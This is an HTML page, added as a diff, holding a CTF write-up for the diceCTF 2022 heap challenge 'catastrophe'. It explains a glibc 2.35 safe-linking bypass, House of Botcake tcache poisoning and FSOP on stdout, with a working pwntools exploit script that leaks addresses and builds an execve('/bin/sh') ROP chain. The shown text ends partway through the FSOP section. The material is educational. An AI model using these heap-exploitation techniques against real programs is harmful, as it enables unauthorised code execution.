@@ -1,0 +1,757 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[diceCTF 2022 - pwn] catastrophe // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[diceCTF 2022 - pwn] catastrophe"/>
+<meta name="twitter:description" content="Introduction  I just learned how to use malloc and free&hellip; am I doing this right?
+ catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in /lib/libc.so.6, then I figured out thanks to my teammate supersnail that I was using the wrong libc."/>
+
+    <meta property="og:title" content="[diceCTF 2022 - pwn] catastrophe" />
+<meta property="og:description" content="Introduction  I just learned how to use malloc and free&hellip; am I doing this right?
+ catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in /lib/libc.so.6, then I figured out thanks to my teammate supersnail that I was using the wrong libc." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/catastrophe/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-07-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-07-28T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[diceCTF 2022 - pwn] catastrophe</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 28, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          18 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/ret2school/">ret2school</a>
+              <a class="tag" href="https://ret2school.github.io/tags/dicectf/">diceCTF</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/aassfxxx/">aaSSfxxx</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2022/">2022</a>
+              <a class="tag" href="https://ret2school.github.io/tags/fsop/">FSOP</a>
+              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="introduction">Introduction</h2>
+<blockquote>
+<p>I just learned how to use malloc and free&hellip; am I doing this right?</p>
+</blockquote>
+<p>catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in <code>/lib/libc.so.6</code>, then I figured out thanks to my teammate <a href="../../tags/supersnail">supersnail</a> that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn&rsquo;t pretty hard but I took a funny way to solve it because I thought the libc had <code>FULL RELRO</code> while  it had only <code>PARTIAL RELRO</code>. Find the exploit and the tasks are <a href="https://github.com/ret2school/ctf/tree/master/2022/diceCTF/pwn/catastrophe">are right here</a>.</p>
+<h2 id="tl-dr">TL; DR</h2>
+<ul>
+<li>Leak heap address + defeating safe linking by printing the first free&rsquo;d chunk in the tcache.</li>
+<li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">House of botcake</a> to create overlapping chunks and get arbitrary write</li>
+<li>FSOP on stdout to leak <code>environ</code> and then ROP over the stack.</li>
+</ul>
+<h2 id="what-we-have">What we have</h2>
+<p>catastrophe is a classic heap challenge here are the classic informations about it:</p>
+<pre tabindex="0"><code>$ ./libc.so.6 
+GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
+Copyright (C) 2022 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 11.2.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+$ checksec --file libc.so.6 
+[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+$ checksec --file catastrophe 
+[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/catastrophe'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p><code>2.35</code> libc, which means there is no more classic hooks like <code>__malloc_hook</code> or <code>__free_hook</code>. The binary allows to:</p>
+<ul>
+<li>malloc up to 0x200 bytes and read data in it with the use of <code>fgets</code></li>
+<li>Allocate from the index 0 to 9</li>
+<li>free anything given the index is between 0 and 9</li>
+</ul>
+<p>Thus we can easily do a <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">House of botcake</a> but first of all we have to defeat the safe linking to properly getting an arbitrary write.</p>
+<h2 id="defeat-safe-linking">Defeat safe-linking</h2>
+<p>Since <code>2.32</code> is introduced in the libc the safe-linking mechanism that does some xor encyptions on <code>tcache</code>, <code>fastbin</code> next fp to prevent pointer hiijacking. Here is the core of the mechanism:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
+</span><span style="color:#6272a4"></span><span style="color:#6272a4">/* Safe-Linking:
+</span><span style="color:#6272a4">   Use randomness from ASLR (mmap_base) to protect single-linked lists
+</span><span style="color:#6272a4">   of Fast-Bins and TCache.  That is, mask the &#34;next&#34; pointers of the
+</span><span style="color:#6272a4">   lists&#39; chunks, and also perform allocation alignment checks on them.
+</span><span style="color:#6272a4">   This mechanism reduces the risk of pointer hijacking, as was done with
+</span><span style="color:#6272a4">   Safe-Unlinking in the double-linked lists of Small-Bins.
+</span><span style="color:#6272a4">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
+</span><span style="color:#6272a4">   larger pages provide less entropy, although the pointer mangling
+</span><span style="color:#6272a4">   still works.  */</span>
+<span style="color:#ff79c6">#define PROTECT_PTR(pos, ptr) \
+</span><span style="color:#ff79c6">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+</span><span style="color:#ff79c6">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
+</span></code></pre></div><p>Since for this challenge we&rsquo;re focused on <code>tcache</code>, here is how a chunk is free&rsquo;d using safe-linking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175
+</span><span style="color:#6272a4"></span><span style="color:#6272a4">/* Caller must ensure that we know tc_idx is valid and there&#39;s room
+</span><span style="color:#6272a4">   for more chunks.  */</span>
+<span style="color:#ff79c6">static</span> __always_inline <span style="color:#8be9fd">void</span>
+<span style="color:#50fa7b">tcache_put</span> (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry <span style="color:#ff79c6">*</span>e <span style="color:#ff79c6">=</span> (tcache_entry <span style="color:#ff79c6">*</span>) chunk2mem (chunk);
+
+  <span style="color:#6272a4">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
+</span><span style="color:#6272a4">     detect a double free.  */</span>
+  e<span style="color:#ff79c6">-&gt;</span>key <span style="color:#ff79c6">=</span> tcache_key;
+
+  e<span style="color:#ff79c6">-&gt;</span>next <span style="color:#ff79c6">=</span> PROTECT_PTR (<span style="color:#ff79c6">&amp;</span>e<span style="color:#ff79c6">-&gt;</span>next, tcache<span style="color:#ff79c6">-&gt;</span>entries[tc_idx]);
+  tcache<span style="color:#ff79c6">-&gt;</span>entries[tc_idx] <span style="color:#ff79c6">=</span> e;
+  <span style="color:#ff79c6">++</span>(tcache<span style="color:#ff79c6">-&gt;</span>counts[tc_idx]);
+}
+</code></pre></div><p>Thus, the first time a chunk is inserted into a tcache list, <code>e-&gt;next</code> is initialized to <code>&amp;e-&gt;next &gt;&gt; 12</code> (heap base address) xor <code>tcache-&gt;entries[tc_idx]</code> which is equal to zero when the list for a given size is empty.</p>
+<p>Which means to leak the heap address we simply have to print a free&rsquo;d chunk once it has been inserted in the tcache.</p>
+<h2 id="house-of-botcake">House of botcake</h2>
+<p>The <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">House of botcake</a> gives a write what where primitive by poisoning the tcache. The algorithm is:</p>
+<ul>
+<li>Allocate 7 <code>0x100</code> sized chunks to then fill the tcache (7 entries).</li>
+<li>Allocate two more <code>0x100</code> sized chunks (<code>prev</code> and <code>a</code> in the example).</li>
+<li>Allocate a small &ldquo;barrier&rdquo; <code>0x10</code> sized chunk.</li>
+<li>Fill the tcache by freeing the first 7 chunks.</li>
+<li>free(a), thus <code>a</code> falls into the unsortedbin.</li>
+<li>free(prev), thus <code>prev</code> is consolidated with <code>a</code> to create a large <code>0x221</code> sized chunk that is yet in the unsortedbin.</li>
+<li>Request one more <code>0x100</code> sized chunk to let a single entry left in the tcache.</li>
+<li>free(a) again, given <code>a</code> is part of the large <code>0x221</code> sized chunk it leads to an UAF. Thus <code>a</code> falls into the tcache.</li>
+<li>That&rsquo;s finished, to get a write what where we just need to request a <code>0x130</code> sized chunk. Thus we can hiijack the next fp of <code>a</code> that is currently referenced by the tcache by the location we wanna write to. And next time two <code>0x100</code> sized chunks are requested, the second one will be the target location.</li>
+</ul>
+<h2 id="getting-arbitrary-write">Getting arbitrary write</h2>
+<p>To make use of the write what were we got thanks to the <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">House of botcake</a>, we need to get both heap and libc leak. To leak libc that&rsquo;s pretty easily we just need to print out a free&rsquo;d chunk stored into the unsortedbin, it&rsquo;s forward pointer is not encrypted with safe-linking.</p>
+<p>As seen previously, to bypass safe-linking we have to print a free&rsquo;d chunk once it has been inserted in the tcache. It would give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to <code>location ^ ((heap_base + chunk_offset) &gt;&gt; 12)</code> to encrypt properly the pointer, this way the primitive is efficient.</p>
+<p>Implmentation of the <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">House of botcake</a> + safe-linking bypass, heap and libc leak:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">
+io <span style="color:#ff79c6">=</span> start()
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">alloc</span>(idx, data, size):
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;-</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Index?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode()) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode()) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;: &#34;</span>, data) 
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">free</span>(idx):
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">view</span>(idx):
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
+    alloc(i, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+
+free(<span style="color:#bd93f9">0</span>)
+
+view(<span style="color:#bd93f9">0</span>)
+
+heap <span style="color:#ff79c6">=</span> ((pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">12</span>))
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap @ </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+<span style="color:#6272a4"># then we defeated safe linking lol</span>
+
+alloc(<span style="color:#bd93f9">0</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+<span style="color:#6272a4"># request back the chunk we used to leak the heap</span>
+
+alloc(<span style="color:#bd93f9">7</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># prev</span>
+alloc(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># a</span>
+
+alloc(<span style="color:#bd93f9">9</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">0x10</span>) <span style="color:#6272a4"># barrier</span>
+
+<span style="color:#6272a4"># fill tcache</span>
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
+    free(i)
+
+free(<span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># free(a) =&gt; unsortedbin</span>
+free(<span style="color:#bd93f9">7</span>) <span style="color:#6272a4"># free(prev) =&gt; merged with a</span>
+
+<span style="color:#6272a4"># leak libc</span>
+view(<span style="color:#bd93f9">8</span>)
+
+libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x219ce0</span> <span style="color:#6272a4"># - 0x1bebe0 # offset of the unsorted bin</span>
+
+rop <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ROP(libc)
+binsh <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+rop<span style="color:#ff79c6">.</span>execve(binsh, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>)
+
+environ <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x221200</span>
+stdout <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x21a780</span>
+
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;environ: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(environ)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stdout: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stdout)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+alloc(<span style="color:#bd93f9">0</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># pop a chunk from the tcache to let an entry left to a </span>
+free(<span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># free(a) =&gt; tcache</span>
+
+alloc(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x108</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64((stdout <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xb20</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>))), <span style="color:#bd93f9">0x130</span>) 
+<span style="color:#6272a4"># 0x130, too big for tcache =&gt; unsortedbin UAF on a to replace a-&gt;next with the address of the target location (stdout) </span>
+alloc(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+<span style="color:#6272a4"># pop a from tcache</span>
+
+<span style="color:#6272a4"># next 0x100 request will return the target location (stdout)</span>
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">0x55c4fbcd7a00:	0x0000000000000000	0x0000000000000141 [prev]
+</span><span style="color:#f1fa8c">0x55c4fbcd7a10:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a20:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a30:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a40:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a50:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a60:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a70:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a80:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7a90:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7aa0:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7ab0:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7ac0:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7ad0:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7ae0:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7af0:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7b00:	0x5454545454545454	0x5454545454545454
+</span><span style="color:#f1fa8c">0x55c4fbcd7b10:	0x5454545454545454	0x0000000000000111 [a]
+</span><span style="color:#f1fa8c">0x55c4fbcd7b20:	0x00007f5d45ff5b57	0x4f60331b73b9000a
+</span><span style="color:#f1fa8c">0x55c4fbcd7b30:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7b40:	0x0000000000000000	0x00000000000000e1 [unsortedbin]
+</span><span style="color:#f1fa8c">0x55c4fbcd7b50:	0x00007f5819b0dce0	0x00007f5819b0dce0
+</span><span style="color:#f1fa8c">0x55c4fbcd7b60:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7b70:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7b80:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7b90:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7ba0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7bb0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7bc0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7bd0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7be0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7bf0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7c00:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7c10:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x55c4fbcd7c20:	0x00000000000000e0	0x0000000000000020
+</span><span style="color:#f1fa8c">0x55c4fbcd7c30:	0x0068732f6e69622f	0x000000000000000a
+</span><span style="color:#f1fa8c">0x55c4fbcd7c40:	0x0000000000000000	0x00000000000203c1 [top chunk]
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div><h2 id="fsop-on-stdout-to-leak-environ">FSOP on stdout to leak environ</h2>
+<p>I didn&rsquo;t see first that only <code>PARTIAL RELRO</code> was enabled on the libc, so the technique I show you here was thought to face a <code>2.35</code> libc with <code>FULL RELRO</code> enabled that the reason why I didn&rsquo;t just hiijack some GOT pointers within the libc.</p>
+<p>A pretty convenient way to gain code execution when the hooks (<code>__malloc_hook</code>, <code>__free_hook</code>) are not present (since <code>2.32</code> cf <a href="https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html">this for 2.34</a>) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the <code>environ</code> symbol stored in the dynamic linker, it contains a pointer toward <code>**envp</code>.</p>
+<p>To read this pointer we need a read what where primitive! Which can be achieved through a file stream oriented programming (FSOP) attack on <code>stdout</code> for example. To dig more FSOP I advise you to read <a href="https://nasm.re/posts/onceforall/">this write-up</a> as well as <a href="https://nasm.re/posts/bookwriter/">this one</a>.</p>
+<p>To understand the whole process I&rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&rsquo;s used ritght after the <code>fgets</code> that reads the input from the user by the <code>puts</code> function. Basically on linux &ldquo;everything is a file&rdquo; from the character device the any stream (error, input, output, opened file) we can interact with  a resource just by opening it and by getting a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> you may have used if you have already did some stuff with files on linux. Here is it definition:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
+</span><span style="color:#6272a4"></span><span style="color:#6272a4">/* The tag name of this struct is _IO_FILE to preserve historic
+</span><span style="color:#6272a4">   C++ mangled names for functions taking FILE* arguments.
+</span><span style="color:#6272a4">   That name should not be used in new code.  */</span>
+<span style="color:#ff79c6">struct</span> _IO_FILE
+{
+  <span style="color:#8be9fd">int</span> _flags;		<span style="color:#6272a4">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+
+  <span style="color:#6272a4">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_read_ptr;	<span style="color:#6272a4">/* Current read pointer */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_read_end;	<span style="color:#6272a4">/* End of get area. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_read_base;	<span style="color:#6272a4">/* Start of putback+get area. */</span>
